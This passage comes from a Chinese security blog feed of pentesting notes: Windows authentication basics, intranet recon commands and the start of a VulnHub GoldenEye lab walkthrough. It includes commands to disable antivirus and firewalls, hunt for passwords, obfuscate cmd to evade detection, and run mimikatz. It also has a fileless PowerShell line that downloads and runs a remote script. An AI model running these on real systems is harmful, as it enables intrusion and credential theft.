    <content type="html"><![CDATA[<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><ul><li><a href="https://github.com/shadow1ng/fscan">fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</a></li></ul><h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><p>1.信息搜集:</p><ul><li>存活探测(icmp)</li><li>端口扫描</li></ul><p>2.爆破功能:</p><ul><li>各类服务爆破(ssh、smb、rdp等)</li><li>数据库密码爆破(mysql、mssql、redis、psql、oracle等)</li></ul><p>3.系统信息、漏洞扫描:</p><ul><li>netbios探测、域控识别</li><li>获取目标网卡信息</li><li>高危漏洞扫描(ms17010等)</li></ul><p>4.Web探测功能:</p><ul><li>webtitle探测</li><li>web指纹识别(常见cms、oa框架等)</li><li>web漏洞扫描(weblogic、st2等,支持xray的poc)</li></ul><p>5.漏洞利用:</p><ul><li>redis写公钥或写计划任务</li><li>ssh命令执行</li><li>ms17017利用(植入shellcode),如添加用户等</li></ul><p>6.其他功能:</p><ul><li>文件保存</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>golang</tag>
      
      <tag>扫描器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows基础</title>
    <link href="/2022/09/23/Windows%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/09/23/Windows%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="Windows基础"><a href="#Windows基础" class="headerlink" title="Windows基础"></a>Windows基础</h3><ul><li>如果Windows服务器上存在安全狗<ul><li>不能kill</li><li>不能暂停</li><li><code>sc config &quot;safedog center guarder&quot; start=disable</code></li><li>通过上面命令重启后就可以关掉安全狗了</li></ul></li><li>防火墙禁止端口出网<ul><li>端口转发 将3389转发到80端口</li><li>隧道技术</li></ul></li><li>注册表<ul><li>可以在注册表里面写入隐藏后门</li></ul></li></ul><h3 id="Windows上的常用端口"><a href="#Windows上的常用端口" class="headerlink" title="Windows上的常用端口"></a>Windows上的常用端口</h3><ul><li>常用端口<ul><li>HTTP协议代理服务器常用端口号：80&#x2F;8080&#x2F;3128&#x2F;8081&#x2F;9080</li><li>FTP（文件传输）协议代理服务器常用端口号：21</li><li>Telnet（远程登录）协议代理服务器常用端口：23</li><li>TFTP（TrivialFile Transfer Protocol ），默认的端口号为69&#x2F;udp；</li><li>SSH（安全登录）、SCP（文件传输）、端口重定向，默认的端口号为22&#x2F;tcp；</li><li>SMTP Simple Mail TransferProtocol (E-mail)，默认的端口号为25&#x2F;tcp（木马Antigen、Email</li><li>Password Sender、HaebuCoceda、ShtrilitzStealth、WinPC、WinSpy都开放这个端口）；</li><li>POP3 Post Office Protocol(E-mail) ，默认的端口号为110&#x2F;tcp；</li><li>TOMCAT，默认的端口号为8080；</li><li>WIN2003远程登陆，默认的端口号为3389；</li><li>Oracle 数据库，默认的端口号为1521；</li><li>MS SQL*SERVER数据库server，默认的端口号为1433&#x2F;tcp1433&#x2F;udp；</li><li>QQ，默认的端口号为1080&#x2F;udp</li></ul></li></ul><h3 id="Windows认证"><a href="#Windows认证" class="headerlink" title="Windows认证"></a>Windows认证</h3><ul><li>Windows密码保存在Sam数据库中<code>%systemroot%\system32\config\</code></li><li>NTLM网络认证协议以NTLM Hash为凭证的一个认证协议</li><li>NTLM认证<ul><li>加密算法：admin(原始密码) –&gt; hex –&gt; unicode –&gt; md4 &#x3D; ntlm hash</li><li>认证方式：winlogon.exe 接受输入后 将明文密码转换为ntlm hash后 lsass.exe与其对比完成认证</li></ul></li><li>LM HASH认证(<del>被淘汰</del>)</li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20220923222200376.png" alt="image-20220923222200376"></p><ul><li><p>NTLM网络认证</p><ul><li>挑战 &lt; — &gt; 相应</li></ul><ol><li>协商 –&gt; 确定协议版本（ntlm v1、ntlm v2）</li><li>咨询</li><li>验证 –&gt; 咨询完之后验证结果</li></ol></li><li><p>咨询</p><ul><li><p>客户端向服务端发送用户信息请求</p></li><li><p>服务端接收到请求，生成一个16位的随机数（challange），使用用户名的NTLM HASH加密challenge，生成challenge1，将challenge发送给客户端</p></li><li><p>客户端接收了challenge，使用ntlm hash加密challenge，得到response（相应），将response发送给服务端</p></li></ul></li><li><p>验证</p><ul><li>收到response，对比challenge1与response是否相等</li></ul></li><li><p>NTLM v1 v2的区别</p><ul><li>V1 challenge 8位 –&gt; DES</li><li>V2 challenge 16位 –&gt; HMAC-MD5</li></ul></li><li><p>Windows版本默认认证方式</p></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">xp 2000:</span> <span class="hljs-string">LM&amp;NTLM</span><br><span class="hljs-number">2003</span><span class="hljs-string">:NTLM</span><br><span class="hljs-number">2008 </span><span class="hljs-string">win7:NTLMV2</span><br><span class="hljs-string">gpedit.msc</span> <span class="hljs-comment"># 组策略编辑可以</span><br></code></pre></td></tr></table></figure><h3 id="APPLocker"><a href="#APPLocker" class="headerlink" title="APPLocker"></a>APPLocker</h3><ul><li>应用程序控制策略</li><li>规则：<ul><li>可执行文件：exe、com</li><li>脚本：ps1、bat、vbs、cmd</li><li>安装文件：msi、msp</li><li>dll文件：dll、ocx</li><li>封装应用程序：appx</li></ul></li><li><code>system32\applocker\.applocker</code></li></ul><h3 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h3><ul><li>AttackSurfaceReduction</li><li>减少攻击面</li><li><a href="https://learn.microsoft.com/zh-cn/microsoft-365/security/defender-endpoint/overview-attack-surface-reduction?view=o365-worldwide">https://learn.microsoft.com/zh-cn/microsoft-365/security/defender-endpoint/overview-attack-surface-reduction?view=o365-worldwide</a></li></ul><h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><ul><li>UserAgentController</li></ul><h3 id="AMSI"><a href="#AMSI" class="headerlink" title="AMSI"></a>AMSI</h3><ul><li>反恶意软件扫描接口</li><li><code>amsiutils</code> 测试是否存在</li></ul><h3 id="Windows-Defender-Token"><a href="#Windows-Defender-Token" class="headerlink" title="Windows Defender Token"></a>Windows Defender Token</h3><ul><li><p>session创建 –&gt; 返回用户sid和组sid –&gt; lsa创建access token –&gt; 登录session</p></li><li><p>根据用户（收否为管理员）分配不一样的令牌</p></li><li><p>交互式登录</p><ul><li>密码存放在lsass中</li><li>控制台登录 2</li><li>rdp登录 10</li><li>psexec 2</li></ul></li><li><p>网络登录</p><ul><li>密码不在内存里：wmi、winrm</li></ul></li><li><p>Access token 是可以被继承的</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集常用命令</title>
    <link href="/2022/09/20/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/20/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h3 id="windows常用工具"><a href="#windows常用工具" class="headerlink" title="windows常用工具"></a>windows常用工具</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"></span><br><span class="language-bash">regedit <span class="hljs-comment"># 注册表，存储了windows相关信息</span></span><br>enentvwr <span class="hljs-comment"># 事件查看器，操作windows系统的时候会有个事件的记录</span><br>gpedit.msc <span class="hljs-comment"># 组策略编辑器</span><br>services.msc <span class="hljs-comment"># 服务查看</span><br></code></pre></td></tr></table></figure><h3 id="windows权限相关"><a href="#windows权限相关" class="headerlink" title="windows权限相关"></a>windows权限相关</h3><ol><li>TrustedInstaller</li><li>system</li><li>administrator</li><li>user</li><li>guestpowershell</li></ol><ul><li>权限继承<ul><li>如果普通的服务ftp&#x2F;http使用管理员打开，那它就会继承管理员的权限</li></ul></li><li>用户组<ul><li>一些用户的集合</li><li>将某个用户添加进去后会自动获取组的权限</li><li>给一个组添加权限组内成员也会获得相关权限</li></ul></li><li>administrators: 管理员组</li><li>guests: 来宾用户组</li><li>users: 普通用户组</li><li>power users: 电源组</li><li>remote desktop: 远程桌面组</li></ul><h3 id="windows常用基础命令"><a href="#windows常用基础命令" class="headerlink" title="windows常用基础命令"></a>windows常用基础命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami <br>net user<br>net user administrator<br>net user username pa<span class="hljs-variable">$</span><span class="hljs-variable">$w0rd</span> /add<br>query user <span class="hljs-comment"># 查看有哪些用户登录了</span><br>net localgroup <span class="hljs-comment"># 查看用户组</span><br>net localgroup admins /add <span class="hljs-comment"># 添加用户组</span><br>net localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span> <span class="hljs-comment"># 查看组内成员</span><br>net localgroup administrators user /<span class="hljs-built_in">del</span> <span class="hljs-comment"># 从组内移除</span><br>tasklist /SVC <span class="hljs-comment"># 查看进程，具体看看有没有杀软</span><br>netstat <span class="hljs-literal">-ano</span> | findstr <span class="hljs-string">&quot;3389&quot;</span><br>ver <span class="hljs-comment"># 5.1 --&gt; 2003 5.2 --&gt; xp | 6.1 --&gt; win7 2008 | 6.2 --&gt; win8 2012 | 10 --&gt; win10</span><br><span class="hljs-built_in">echo</span> %PROCESSOR_ARCHITECTURE% <span class="hljs-comment"># 查看系统架构</span><br>systeminfo <span class="hljs-comment"># 都查</span><br>route print<br>arp <span class="hljs-literal">-a</span><br>netsh firewall show config <span class="hljs-comment"># 查看防火墙状态</span><br><br><span class="hljs-comment"># 关闭防火墙</span><br>netsh firewall <span class="hljs-built_in">set</span> opmode disable <span class="hljs-comment"># 2003之前</span><br>netsh advfirewall <span class="hljs-built_in">set</span> allprofile state off <span class="hljs-comment"># 2003之后</span><br><br><span class="hljs-comment"># 查找敏感信息</span><br><span class="hljs-built_in">dir</span> /s /b C:\phpinfo.php <span class="hljs-comment"># 查找网站根目录</span><br><span class="hljs-built_in">dir</span> /s /b <span class="hljs-string">&quot;*username*&quot;</span> <span class="hljs-string">&quot;*password*&quot;</span> <span class="hljs-comment"># 查找敏感信息</span><br>findstr /I /C:<span class="hljs-string">&quot;user=&quot;</span> /C:<span class="hljs-string">&quot;pass=&quot;</span> /<span class="hljs-built_in">si</span> *.conf *.asp <span class="hljs-comment"># 查找敏感信息</span><br>tree /A | findstr /BV /C:<span class="hljs-string">&quot;| |&quot;</span> <span class="hljs-comment"># 树形结构</span><br><br></code></pre></td></tr></table></figure><h3 id="cmd的混淆-过杀软"><a href="#cmd的混淆-过杀软" class="headerlink" title="cmd的混淆 过杀软"></a>cmd的混淆 <del>过杀软</del></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 通过环境变量混淆</span><br><br><span class="hljs-built_in">set</span> a=cmd /c whomai<br>%a%<br><br><span class="hljs-comment"># 通过双引号混淆</span><br>wh<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>am<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span>i<br><br><span class="hljs-comment"># 转义符</span><br>n^e^t u^ser<br>wh^<br>ami<br><br><span class="hljs-comment"># 管道符</span><br><span class="hljs-built_in">echo</span> calc |cmd<br><br><span class="hljs-comment"># @符号</span><br>cmd /c <span class="hljs-string">&quot;set x=c@alc &amp; echo %x:@=% |cmd&quot;</span> <span class="hljs-comment"># @符将值传递到前面的环境变量里</span><br><br><span class="hljs-comment"># 字符串提取</span><br><span class="hljs-built_in">set</span> a=abcd<br>%a:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>% <span class="hljs-literal">--</span>&gt; a<br><span class="hljs-built_in">set</span> a=abcd &amp; %a:~<span class="hljs-number">2</span>,<span class="hljs-number">1</span>%alc <span class="hljs-literal">--</span>&gt; calc<br><br><span class="hljs-comment"># 括号绕过</span><br>cmd /c <span class="hljs-string">&quot;((ipconfig))&quot;</span><br><span class="hljs-comment"># 分号 逗号绕过</span><br>cmd ,,,,,;,;,;;,;asdas;d,sda;, /c whoami<br><span class="hljs-comment"># for绕过</span><br><span class="hljs-comment"># tokens: 表示第几列 delims: 表示分割符</span><br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;tokens=4 delims=\&quot;</span> %g <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;c:\windows\system32\powershell&quot;</span>) <span class="hljs-keyword">do</span> %g<br><br><span class="hljs-comment"># c:\windows\system32\powershell\以\作为分割符、提取第四列进行执行</span><br></code></pre></td></tr></table></figure><ul><li>dos混淆脚本</li><li><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></li></ul><h3 id="wmic信息收集"><a href="#wmic信息收集" class="headerlink" title="wmic信息收集"></a>wmic信息收集</h3><ul><li><p>很强大的cmd增强软件</p></li><li><p>需要开启Windows management instrumentation port:135</p></li><li><p>environment</p><ul><li>assoc create delete get list set</li></ul></li><li><p>输出等级</p><ul><li>full brief instance status<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic environment <span class="hljs-built_in">where</span> <span class="hljs-string">&quot;name=TEMP&quot;</span> get status,username<br></code></pre></td></tr></table></figure></li></ul></li><li><p>useraccount</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic useraccount list brief <span class="hljs-comment"># 查询用户</span><br></code></pre></td></tr></table></figure></li><li><p>cpu</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic cpu get name<br></code></pre></td></tr></table></figure></li><li><p>os</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic os get /?<br></code></pre></td></tr></table></figure></li><li><p>bios</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic bios get biosersion,name <span class="hljs-comment"># bios信息</span><br></code></pre></td></tr></table></figure></li><li><p>process</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic <span class="hljs-keyword">process</span> list brief <span class="hljs-comment"># 查看进程信息 brief 简要信息 </span><br>wmic <span class="hljs-keyword">process</span> call create calc<br></code></pre></td></tr></table></figure></li><li><p>service</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic service list brief <span class="hljs-comment"># 查看服务</span><br>wmic service <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;mysql&quot;</span> call stopservice/startservice  <span class="hljs-comment"># 开启/停止服务</span><br>wmic service <span class="hljs-built_in">where</span> State=<span class="hljs-string">&quot;Running&quot;</span> list brief <span class="hljs-comment"># 查看开启的服务</span><br></code></pre></td></tr></table></figure></li><li><p>job</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic job list brief <span class="hljs-comment"># 查看计划任务</span><br></code></pre></td></tr></table></figure><ul><li>qfe</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic qfe list brief <span class="hljs-comment"># 查看系统补丁</span><br>wmic qfe <span class="hljs-built_in">where</span> HotFixID=<span class="hljs-string">&quot;KB414&quot;</span> delete <span class="hljs-comment"># 删除系统补丁，需要重启</span><br></code></pre></td></tr></table></figure><ul><li>product</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic product get name,version <span class="hljs-comment"># 查看装的软件和版本，针对软件提权</span><br>wmic product <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;name&quot;</span> call uninstall <span class="hljs-comment"># 卸载软件</span><br></code></pre></td></tr></table></figure><ul><li><p>nicconfig : 网络相关</p></li><li><p>fsdir</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic fsdir <span class="hljs-built_in">where</span> <span class="hljs-string">&quot;dirve=&#x27;C:&#x27; and filename=&#x27;windows&#x27;&quot;</span> list <span class="hljs-comment"># 搜索文件</span><br></code></pre></td></tr></table></figure><ul><li>远程执行</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic /node:ip /user: /password: <span class="hljs-keyword">process</span> call calc<br></code></pre></td></tr></table></figure><ul><li>wmic开3389</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic rdtoggle list <span class="hljs-comment"># 查看是否开启3389</span><br>wmic RDTOGGLE <span class="hljs-built_in">WHERE</span> ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="hljs-number">1</span> <span class="hljs-comment"># 2003</span><br>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting <span class="hljs-built_in">where</span>(__CLASS !=<span class="hljs-string">&quot;&quot;</span>) call SetAllowTSconnections <span class="hljs-number">1</span> <span class="hljs-comment"># 2008</span><br>wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting <span class="hljs-built_in">where</span>(TerminalName=<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) call setuserauthenticationrequired <span class="hljs-number">1</span> <span class="hljs-comment"># 2012</span><br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>查看报错</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net helpmsg <span class="hljs-number">1350</span><br></code></pre></td></tr></table></figure><ul><li>开3389</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="hljs-number">00000000</span> /f<br></code></pre></td></tr></table></figure><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><ul><li>容易做免杀，在内存中运行</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-Host</span> <span class="hljs-comment"># 查看Powershell版本</span><br></code></pre></td></tr></table></figure><ul><li>Powershell执行策略</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ExecutionPolicy</span><span class="hljs-comment"># 查看执行策略</span><br><span class="hljs-comment"># restricted(default): 脚本不能运行</span><br><span class="hljs-comment"># RemoteSingned: 本地创建的可以运行，网上下载的非签名的不能运行</span><br><span class="hljs-comment"># Allsigned: 拥有可信任签名的可以运行</span><br><span class="hljs-comment"># Unrestricted: 所有都可以运行</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> unrestricted <span class="hljs-comment"># 修改执行策略</span><br></code></pre></td></tr></table></figure><ul><li>Powershell常用命令</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">more file.txt <span class="hljs-comment"># 分页查看文件</span><br></code></pre></td></tr></table></figure><ul><li>powershell常用框架<ul><li>powerup</li><li>powersploit</li></ul></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">### powersploit常用模块</span><br>code <span class="hljs-comment"># 执行代码</span><br>script <span class="hljs-comment"># 木马感染</span><br>per <span class="hljs-comment"># 权限维持</span><br>anti <span class="hljs-comment"># 杀软检测</span><br>exfi <span class="hljs-comment"># 数据窃取</span><br>may <span class="hljs-comment"># 混乱</span><br>pri <span class="hljs-comment"># 权限提升</span><br>recon <span class="hljs-comment"># 信息化搜集</span><br></code></pre></td></tr></table></figure><ul><li>通过Import-Module导入模块</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Get-ComputerDetails</span>.ps1<br></code></pre></td></tr></table></figure><ul><li>绕过powershell执行策略执行代码</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-ExecutionPolicy</span> bypass <span class="hljs-operator">-file</span> xxx.ps1 <span class="hljs-comment"># 直接执行</span><br>powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;&amp;&#123;import-module C:\Users\Administrator\Desktop\invoke-mimikatz.ps1;invoke-mimikatz&#125;&quot;</span> <span class="hljs-comment"># 导入模块</span><br></code></pre></td></tr></table></figure><ul><li>无文件落地</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-literal">-windowsStyle</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-Nop</span> <span class="hljs-literal">-nonl</span> <span class="hljs-literal">-noexit</span> <span class="hljs-literal">-nologo</span> <span class="hljs-built_in">iex</span>(<span class="hljs-built_in">New-Object</span> Net.webclient).downloadstring(<span class="hljs-string">&#x27;http://172.21.222.12/xx.ps1&#x27;</span>);<br><span class="hljs-comment"># -nop = -noprofile 不加载用户配置</span><br><span class="hljs-comment"># -nonl 不进行交互</span><br><span class="hljs-comment"># -noexit 执行完不退出</span><br><span class="hljs-comment"># -nolog 执行时不显示logo</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>内网</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GoldenEye-v1-WP</title>
    <link href="/2022/09/16/GoldenEye-v1-WP/"/>
    <url>/2022/09/16/GoldenEye-v1-WP/</url>
    
    <content type="html"><![CDATA[<h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><ul><li><a href="https://www.vulnhub.com/entry/goldeneye-1,240/https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/https://www.vulnhub.com/entry/goldeneye-1,240/</a></li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><ul><li>通过<code>arp-scan -l</code>扫描到目标靶机的地址192.168.80.133<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916001850.png"></li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>通过<code>nmap -p- 192.168.80.133</code>对目标靶机进行一个全端口的扫描<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916002402.png"><ul><li>发现该靶机是一个web站点，接下来对web服务进行信息收集</li></ul></li></ul><h3 id="web信息收集"><a href="#web信息收集" class="headerlink" title="web信息收集"></a>web信息收集</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916002543.png"></p><ul><li>发现有一个可以登录目录</li><li>对网页源码进行查看发现一个引入了一个js文件</li><li>通过对该代码进行简单查看可以发现两个用户名Boris、Natalya</li><li>还有一个通过解码可以得到的密码</li><li>解码后得到一个似乎是明文密码的字符串<code>InvincibleHack3r</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916002946.png"></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> data = [<br>    &#123;<br>        <span class="hljs-title class_">GoldenEyeText</span>: <span class="hljs-string">&quot;&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;&quot;</span><br>    &#125;<br>];<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//Boris, make sure you update your default password. </span><br><span class="hljs-comment">//My sources say MI6 maybe planning to infiltrate. </span><br><span class="hljs-comment">//Be on the lookout for any suspicious network traffic....</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//I encoded you p@ssword below...</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//BTW Natalya says she can break your codes</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">var</span> allElements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">&quot;typeing&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; allElements.<span class="hljs-property">length</span>; j++) &#123;<br>    <span class="hljs-keyword">var</span> currentElementId = allElements[j].<span class="hljs-property">id</span>;<br>    <span class="hljs-keyword">var</span> currentElementIdContent = data[<span class="hljs-number">0</span>][currentElementId];<br>    <span class="hljs-keyword">var</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(currentElementId);<br>    <span class="hljs-keyword">var</span> devTypeText = currentElementIdContent;<br><br><br>    <span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, isTag, 